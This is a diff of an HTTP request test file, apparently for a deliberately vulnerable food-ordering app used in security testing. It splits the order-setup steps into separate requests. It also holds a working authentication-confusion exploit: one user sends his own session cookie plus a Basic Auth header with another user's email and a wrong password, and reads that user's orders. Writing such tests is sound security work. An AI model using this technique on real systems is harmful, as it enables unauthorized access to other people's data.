@@ -17,36 +17,57 @@
 # 3. Basic Auth sets g.email = patrick, cookie auth succeeds, handler reads Patrick's orders
 # 4. Plankton sees Patrick's order history instead of his own
 
-### Step 1: Seed data - Patrick places an order so there's something to steal
-# @name patrick_order_setup
+### Seed the database
+# @name seed
 {{
   await platform.seed({ patrick: 200, plankton: 100 });
-
-  // Patrick creates cart, adds item, and checks out
-  const cartResp = await fetch(url("/cart"), {
-    method: "POST",
-    headers: { "Authorization": auth.basic("patrick") }
-  });
-  const { cart_id } = await cartResp.json();
-
-  await fetch(url("/cart/" + cart_id + "/items"), {
-    method: "POST",
-    headers: {
-      "Authorization": auth.basic("patrick"),
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ item_id: menu.item("Krabby Patty").id })
-  });
-
-  await fetch(url("/cart/" + cart_id + "/checkout"), {
-    method: "POST",
-    headers: {
-      "Authorization": auth.basic("patrick"),
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ delivery_address: "Under the Rock", tip: 0 })
-  });
 }}
+# @ucskip
+# @tag orders, r02, v201, vulnerable
+GET /orders
+Authorization: {{auth.basic("patrick")}}
+
+
+### Step 1a: Patrick creates a cart
+# @name patrick_cart
+# @forceRef seed
+# @tag orders, r02, v201, vulnerable
+POST /cart
+Authorization: {{auth.basic("patrick")}}
+
+@patrick_cart_id = {{$(response).field("cart_id")}}
+?? js $(response).status() == 201
+
+
+### Step 1b: Patrick adds an item to the cart
+# @name patrick_cart_item
+# @forceRef patrick_cart
+# @tag orders, r02, v201, vulnerable
+POST /cart/{{patrick_cart_id}}/items
+Authorization: {{auth.basic("patrick")}}
+Content-Type: application/json
+
+{ "item_id": "{{menu.item("Krabby Patty").id}}" }
+
+?? js $(response).isOk() == true
+
+
+### Step 1c: Patrick checks out - creating an order to steal
+# @name patrick_order_setup
+# @forceRef patrick_cart_item
+# @tag orders, r02, v201, vulnerable
+POST /cart/{{patrick_cart_id}}/checkout
+Authorization: {{auth.basic("patrick")}}
+Content-Type: application/json
+
+{ "delivery_address": "Under the Rock", "tip": 0 }
+
+?? js $(response).status() == 201
+
+
+### Step 1d: Verify Patrick can see his order
+# @name patrick_sees_order
+# @forceRef patrick_order_setup
 # @tag orders, r02, v201, vulnerable
 GET /orders
 Authorization: {{auth.basic("patrick")}}
@@ -54,9 +75,10 @@ Authorization: {{auth.basic("patrick")}}
 ?? js $(response).isOk() == true
 ?? js $(response).hasOnlyUserData("patrick") == true
 
+
 ### Step 2: Plankton logs in legitimately
 # @name plankton_login
-# @forceRef patrick_order_setup
+# @forceRef patrick_sees_order
 # @tag orders, r02, v201, vulnerable
 POST /auth/login
 Content-Type: application/json
@@ -71,6 +93,7 @@ Content-Type: application/json
 }}
 ?? js $(response).isOk() == true
 
+
 ### Step 3: Plankton verifies he can see his own (empty) orders
 # @name plankton_own_orders
 # @forceRef plankton_login
@@ -80,6 +103,7 @@ GET /orders
 Cookie: {{plankton_cookie}}
 
 ?? js $(response).isOk() == true
+
 
 ### Step 4: EXPLOIT - Plankton uses cookie + Patrick's email in Basic Auth
 # @name session_hijack_exploit
@@ -92,6 +116,7 @@ Authorization: Basic {{user("patrick").email}}:wrong_password_doesnt_matter
 # VULNERABILITY CONFIRMED: Returns Patrick's orders, not Plankton's!
 ?? js $(response).isOk() == true
 ?? js $(response).hasOnlyUserData("patrick") == true
+
 
 ### Step 5: Verify the hijack persists to account/info endpoint
 # @name verify_hijack_account
